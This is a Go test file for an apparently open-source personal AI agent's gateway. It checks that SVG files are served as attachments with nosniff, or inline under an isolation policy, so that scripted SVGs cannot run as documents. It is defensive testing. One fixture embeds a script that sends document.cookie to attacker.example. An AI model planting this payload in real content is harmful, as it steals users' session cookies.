// Omnipus - Ultra-lightweight personal AI agent
// License: MIT
// Copyright (c) 2026 Omnipus contributors

// ADR-067 stage 1 — FR-008a, §10.4's `.svg` row, spec §13 test 123
// (TestSvgInSpa_ImageNotDocument), SERVER HALF ONLY.
//
// READ THIS BEFORE TREATING `.svg` AS COVERED.
//
// §10.4 puts `.svg` on the inline allow-list and then states the condition
// plainly: "All three must pass before `.svg` ships inline." The three are the
// three ways an SVG is reachable:
//
//	94  E2E_SvgWithScript_TopLevel_IsInert           — the token URL, as a document
//	122 preview-isolation.spec.ts › SVG subresource  — inside a sandboxed bundle
//	123 TestSvgInSpa_ImageNotDocument                — inside the SPA
//
// Tests 94 and 122 are Playwright and DO NOT EXIST: tests/e2e/preview-isolation.spec.ts
// is a `test.skip(true, …)` placeholder. This file supplies test 123's SERVER
// half — the part that lives in pkg/gateway — and nothing else. It does not
// close 94 or 122, and it must not be read as doing so: a Go assertion about
// response headers cannot show that a browser honours them.
//
// What the SERVER half is, in the spec's words: "the authenticated route
// answers with an attachment, the correct type and nosniff." That is the second
// of the two closed URLs §10.4 relies on. The first — the token URL — is closed
// by the §10.3 policy, which is asserted byte for byte elsewhere but has never
// been RUN against an SVG document in any engine. §10.4 says so itself: "This is
// reasoned from the measured HTML result, not separately measured."

package gateway

import (
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// scriptedSVG is an SVG that would beacon the session cookie to an external
// origin if a browser ever treated it as a document. It is the same shape of
// payload the E2E halves use, so a passing server half and a failing browser
// half cannot be blamed on different fixtures.
const scriptedSVG = `<svg xmlns="http://www.w3.org/2000/svg" width="8" height="8">` +
	`<script>fetch("https://attacker.example/steal?c="+document.cookie)</script>` +
	`<rect width="8" height="8" fill="#D4AF37"/></svg>`

// TestSvgInSpa_ImageNotDocument is spec test 123's server half.
//
// The SPA fetches an image over the AUTHENTICATED Library path and draws it in
// an <img>. That path must therefore keep serving `.svg` as an attachment with
// the extension-derived type and nosniff — so even if some future SPA change
// navigated to the URL instead of drawing it, the response is a download rather
// than a document.
func TestSvgInSpa_ImageNotDocument(t *testing.T) {
	api, workspaceID := buildLibraryTestAPI(t)
	dir := workDir(api, workspaceID)
	require.NoError(t, os.MkdirAll(dir, 0o700))
	require.NoError(t, os.WriteFile(filepath.Join(dir, "logo.svg"), []byte(scriptedSVG), 0o600))

	t.Run("the authenticated route serves an attachment", func(t *testing.T) {
		rec := libGet(t, api, "/api/v1/library/"+workspaceID+
			"/download?path="+url.QueryEscape("logo.svg"))
		require.Equal(t, http.StatusOK, rec.Code, rec.Body.String())
		require.Equal(t, scriptedSVG, rec.Body.String(),
			"the real bytes must have been served, or the header assertions describe an error page")

		assert.True(t, strings.HasPrefix(rec.Header().Get("Content-Disposition"), "attachment;"),
			"FR-003g: the authenticated Library path serves attachments unchanged. This is one "+
				"of the two URLs §10.4 relies on being closed for the scriptable format on its "+
				"own allow-list")
		assert.Equal(t, "image/svg+xml", rec.Header().Get("Content-Type"),
			"FR-015a: from the compiled-in table, never from the bytes")
		assert.Equal(t, "nosniff", rec.Header().Get("X-Content-Type-Options"),
			"FR-015: the browser must not second-guess the type")
		assert.Empty(t, rec.Header().Values("Content-Security-Policy"),
			"MV-13: an attachment on the authenticated path carries no isolation policy — "+
				"the attachment IS the control there")
	})

	t.Run("the token route serves it inline under the isolation policy", func(t *testing.T) {
		// The other of the two URLs. §10.4's justification for allow-listing a
		// scriptable format is that the token path "applies one policy to every
		// byte it serves", so the SVG document gets the same opaque origin and
		// zero egress an .html document gets.
		//
		// THIS ASSERTS THE RESPONSE, NOT THE CONTAINMENT. Whether an engine
		// actually confines an SVG document under this policy was never
		// measured — §10.4 says so — and test 94 is what would settle it.
		want := specIsolationPolicy(t)
		rec := serveViaLibraryPreviewRoute(t, "logo.svg", []byte(scriptedSVG))

		require.Equal(t, http.StatusOK, rec.Code, rec.Body.String())
		assert.Equal(t, "inline", rec.Header().Get("Content-Disposition"),
			"§10.4 lists .svg as inline on the token path")
		assert.Equal(t, "image/svg+xml", rec.Header().Get("Content-Type"))
		assert.Equal(t, "nosniff", rec.Header().Get("X-Content-Type-Options"))
		assert.Equal(t, want, rec.Header().Get("Content-Security-Policy"),
			"the entire justification for allow-listing a scriptable format is that this "+
				"response carries the policy; without it .svg is stored XSS on the gateway origin")
	})
}

// TestSvgInlineAllowListPrecondition_IsRecordedNotAssumed makes §10.4's
// unmet precondition visible in the suite instead of only in a document.
//
// §10.4: "All three must pass before `.svg` ships inline." Two of the three are
// Playwright specs that do not exist yet. Rather than assert their absence —
// which would go green the moment someone wrote an empty file with the right
// name — this test asserts the two facts that ARE checkable and that together
// make the gap unambiguous: `.svg` IS on the shipped allow-list, and the token
// path DOES serve it as a document. Anyone reading a green suite and concluding
// `.svg` is browser-verified is contradicted by this test's own name and doc.
//
// It is deliberately not a failing gate. Failing the build here would block the
// branch on work owned by another wave; the debt is reported, not hidden.
func TestSvgInlineAllowListPrecondition_IsRecordedNotAssumed(t *testing.T) {
	require.True(t, libraryExtIsInline(".svg"),
		"§10.4 places .svg on the inline allow-list; if it has been removed, this test and "+
			"the note above it are stale and should go")

	assert.Equal(t, "image/svg+xml", libraryContentTypeForExt(".svg"),
		"served as a real SVG document on the token path — which is precisely why tests 94 "+
			"and 122 are named as preconditions in §10.4 and why their absence is a live gap, "+
			"not a coverage nicety")
}
